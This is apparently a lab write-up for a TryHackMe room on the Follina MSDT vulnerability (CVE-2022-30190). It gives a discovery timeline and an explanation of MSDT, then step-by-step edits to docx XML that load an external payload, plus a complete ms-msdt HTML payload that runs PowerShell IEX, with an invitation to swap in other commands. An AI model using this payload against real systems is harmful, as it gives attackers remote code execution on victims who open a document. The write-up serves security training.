
# Fz3r0 Operations  [OffSec / Hacking]

![My Video](https://user-images.githubusercontent.com/94720207/165892585-b830998d-d7c5-43b4-a3ad-f71a07b9077e.gif)

## Follina MSDT [Try Hack Me]

_A walkthrough on the CVE-2022-30190, the MSDT service, exploitation of the service vulnerability, and consequent detection techniques and remediation processes_

---

##### Twitter  : [@fz3r0_OPs](https://twitter.com/Fz3r0_OPs) 
##### Github  : [Fz3r0](https://github.com/fz3r0) 

---

#### Keywords: `CVE-2022-30190` `Exploit` `Hacking` `THM` `Windows` `MSDT` `Microsoft Office` `MSDT-Follina`

---

### Introduction

Microsoft explains that "a remote code execution vulnerability exists when MSDT is called using the URL protocol from a calling application such as Word. An attacker who successfully exploits this vulnerability can run arbitrary code with the privileges of the calling application. The attacker can then install programs, view, change, or delete data, or create new accounts in the context allowed by the user’s rights"

### Learning Objectives:

In this room, we will explore what the Microsoft Support Diagnostic Tool is and the discovered vulnerability that it has. In the process, we will be able to experience exploiting this vulnerability and consequently learn some techniques to detect and mitigate its exploitation in our own environments

---

### CVE-2022-30190

The MSDT exploit is not something new - in fact, a bachelor’s thesis has been published August of 2020 regarding techniques on how to use MSDT for code execution. Almost two years after that initial publication, pieces of evidence of MSDT exploitation as well as code execution via Office URIs has triggered several independent researchers to file separate reports to MSRC, the latter of which has been patched (specifically in Microsoft Teams) whereas the former remained vulnerable

It’s not until the discovery of nao_sec, which has been made public in twitter, that attacks using this particular vector is actively being made in the wild. This is consequently picked up by Kevin Beaumont who publicly identified it as a zero day that Microsoft EDR products are failing to detect, and then later classified by Microsoft as a zero day with the vulnerability name CVE-2022-30190

#### Summarized timeline of its discovery:

- August 1st 2020  — A bachelor thesis is published detailing how to use MSDT to execute code
- March 10th 2021  — researchers report to Microsoft how to use Microsoft Office URIs to execute code using Microsoft Teams as an example. Microsoft fail to issue a CVE or inform customers, but stealth patched it in Microsoft Teams in August 2021. They did not patch MSDT in Windows or the vector in Microsoft Office (Link)
- April 12th 2022  — first report to Microsoft MSRC of exploitation in wild via MSDT, by leader of Shadowchasing1, an APT hunting group. This document is an in the wild, real world exploit targeting Russia, themed as a Russian job interview

![image](https://user-images.githubusercontent.com/94720207/180611650-2bc82256-8dfe-48e0-986c-351cec4e385f.png)

- April 21st 2022  — Microsoft MSRC closed the ticket saying not a security related issue (for the record, msdt executing with macros disabled is an issue)

![image](https://user-images.githubusercontent.com/94720207/180611661-42ecc7e0-6a30-4a05-8eb4-e8840ae69857.png)

- May 27th 2022  — Security vendor Nao tweet a document uploaded from Belarus, which is also an in the wild attack.
- May 29th 2022  — Kevin Beaumont identified this was a zero day publicly as it still works against Office 365 Semi Annual channel, and ‘on prem’ Office versions and EDR products are failing to detect
- May 31st 2022  — Microsoft classify this a zero day in Microsoft Defender Vulnerability Management

![image](https://user-images.githubusercontent.com/94720207/180611678-c31aab00-bb08-4803-85bd-2fc2cfb07d20.png)

- June 14th 2022  — a fix for this vulnerability, CVE-2022–30190, is available in June 2022’s Patch Tuesday

---

### The MSDT Service

Microsoft states that "the Microsoft Support Diagnostic Tool (MSDT) collects information to send to Microsoft Support. They will then analyze this information and use it to determine the resolution to any problems that you may be experiencing on your computer"

With that in mind, it’s essentially a way for Microsoft Support to immediately see what’s wrong as they’re getting all the information they need straight from the source

Think of it like this - you’re having car problems and you don’t know about cars at all. You call your trusty car mechanic, but instead of him asking you to check different parts of the car while he tries to deduce what’s wrong with it remotely, he just gives you a **passkey**, instructs you how to use it and the car will magically produce a report that you can then send to the mechanic. Quick, easy, and efficient.

---

### Exploiting the Follina Windows Vulnerability

Before we do any exploitation in the machine, let’s first try and make sense of the baseline processes of the machine. It is in having a sense of normalcy that we’d be able to spot minute changes later on that may consequently reveal malicious activity by a threat actor in our environment.

The process explorer from sysinternals has already been downloaded and pinned in the taskbar for easier access. Proceed to open it and scan through the processes currently running in the machine. Keep it open as we go through the activities later on so you'd be able to immediately see how an exploited follina-msdt vulnerability would look like as compared to the "baseline" - the processes that we're seeing while the machine is immaculate.

### Exploit Explanation

Let’s start with a disclaimer: for our purposes, we’ll be loading our payload via a word document, particularly in the .docx format - this is the original exploit that has been discovered in the wild. However, this vulnerability has been proved to work in a number of other office products, and the student is obliged to maximize learning by trying them out separately.

Two important aspects of this vulnerability are: 1) specific docx files contain OLE (originally abbreviates to Object Linking and Embedding) Object references, and sometimes, they take the form of HTML files hosted elsewhere, and 2) MS-MSDT allows for code execution.

Combining the above two aspects together, an MS-MSDT HTML scheme can be used to execute PowerShell code, and that a docx file can be used to load it via word’s external reference capability.

More specifically, drilling into the docx structure, the word/_rels/document.xml.rels file has an XML tag `<Relationship>` with an attribute `Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"` that describes an external oleObject reference. In order to exploit this docx feature, we can edit the contents of this tag to point instead to the payload that we're hosting by changing the `Target` value into http://<external_payload_server.com>/<payload.html> and the `TargetMode` value into "External".

In the word/document.xml file, there's an XML tag that starts with `<o:OLEObject...>` wherein we should change the Type value to `"Link"` and then add the Key-Value pair attribute `UpdateMode="OnCall"`.

The only thing left to do now is to host the payload that the word file will be connecting to, and receiving instructions from upon opening of the file. This is done by creating an html file with a structure similar to this:

```html
<!doctype html>

<html lang="en">

<body>

<script>

//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA should be repeated >60 times

  window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=h$(IEX('calc.exe'))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe \"";

</script>

</body>

</html>
```

In the above contents of the html file, you'd notice the `ms-msdt:/id PCWDiagnostic /skip force /param` command, along with the command switches you can use to set the command you want to execute in the target machine. You can then mix and match the payload according to your purposes.

As such, we now have a way to achieve remote code execution without touching any macros, and as we'll see later, without even opening the malicious document.

---

### References

- https://tryhackme.com/room/follinamsdt
- https://msrc-blog.microsoft.com/
- https://positive.security/blog/ms-officecmd-rce
- https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-30190
- https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e
- https://benjamin-altpeter.de/doc/thesis-electron.pdf
- https://docs.microsoft.com/en-us/troubleshoot/sql/general/answers-questions-msdt
- https://social.technet.microsoft.com/wiki/contents/articles/30458.windows-10-ctp-how-to-run-microsoft-support-diagnostic-tool.aspx
- 



---

> ![hecho en mexico 5](https://user-images.githubusercontent.com/94720207/166068790-fa1f243d-2db9-4810-a6e4-eb3c4ad23700.png)
>
> _- Hecho en México - by [Fz3r0 💀](https://github.com/Fz3r0/)_ 
>
> _"In the mist of the night you could see me come, where shadows move and Demons lie..."_ 
